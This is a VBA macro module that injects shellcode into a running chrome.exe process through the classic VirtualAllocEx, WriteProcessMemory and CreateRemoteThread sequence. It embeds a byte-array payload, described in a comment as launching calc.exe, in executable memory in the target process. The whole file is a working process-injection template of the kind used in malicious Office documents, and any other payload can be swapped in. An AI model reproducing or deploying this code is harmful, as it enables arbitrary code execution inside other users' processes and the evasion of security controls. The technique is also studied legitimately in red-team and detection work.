Attribute VB_Name = "CodeInjection"
' Win32 API Declaration
#If VBA7 Then
    Private Declare PtrSafe Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Any, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As LongPtr
    Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As Integer) As LongPtr
#Else
    Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
    Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Any, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
    Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Integer) As Long
#End If

' Constants
Const PROCESS_CREATE_THREAD = &H2
Const PROCESS_QUERY_INFORMATION = &H400
Const PROCESS_VM_OPERATION = &H8
Const PROCESS_VM_READ = &H10
Const PROCESS_VM_WRITE = &H20
Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const PAGE_EXECUTE_READWRITE = &H40

' Returns the Id of a given process using WMI query
Private Function GetProcessId(ByVal pName As String) As Long
    Dim strComputer As String
    Dim objServices As Object
    Dim listProcess As Object
    Dim PID As Long
    
    strComputer = "."

    Set objServices = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
    Set listProcess = objServices.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '" & pName & "'")
    PID = listProcess.ItemIndex(0).ProcessId
    GetProcessId = PID
    
End Function

' Main sub
' Injects shellcode to another process that spawns calc.exe using VirtualAllocEx\WriteProcessMemory\CreateRemoteThread technique
Sub Inject()
    Dim vShellCode As Variant
    Dim lPid, i As Long
    Dim sBuffer As String
    
    #If VBA7 Then
        Dim hProcess, lpMemory, lResult As LongPtr
    #Else
        Dim hProcess, lpMemory, lResult As Long
    #End If
    
    ' Shellcode to pop calc.exe
    vShellCode = Array(232, 137, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, _
                139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, _
                13, 1, 199, 226, 240, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, _
                116, 74, 1, 208, 80, 139, 72, 24, 139, 88, 32, 1, 211, 227, 60, 73, 139, 52, 139, 1, _
                214, 49, 255, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, _
                36, 117, 226, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, _
                139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, _
                235, 134, 93, 106, 1, 141, 133, 185, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, _
                224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, _
                187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 97, 108, 99, 0)
    
	' Gets chrome.exe handle
    lPid = GetProcessId("chrome.exe")
    hProcess = OpenProcess(PROCESS_CREATE_THREAD Or PROCESS_QUERY_INFORMATION Or PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, 0, lPid)
    If hProcess = 0 Then
        MsgBox "OpenProcess failed. " & Err.LastDllError
        Exit Sub
    End If
	' Memory allocation
    lpMemory = VirtualAllocEx(hProcess, 0, UBound(vShellCode), MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If lpMemory = 0 Then
        MsgBox "VirtualAllocEx failed. " & Err.LastDllError
        Exit Sub
    End If
	' Writes shellcode to memory
    For i = LBound(vShellCode) To UBound(vShellCode)
            sBuffer = Chr("&H" & Hex(vShellCode(i)))
            lResult = WriteProcessMemory(hProcess, lpMemory + i, sBuffer, 1, 0)
            If lResult = 0 Then
                MsgBox "WriteProcessMemory failed. " & Err.LastDllError
                Exit Sub
            End If
    Next i
    
	' Spawns calc.exe
    lResult = CreateRemoteThread(hProcess, 0, 0, lpMemory, 0, 0, 0)
    If lResult = 0 Then
        MsgBox "CreateRemoteThread failed. " & Err.LastDllError
        Exit Sub
    End If
    CloseHandle (hProcess)
    
    
End Sub

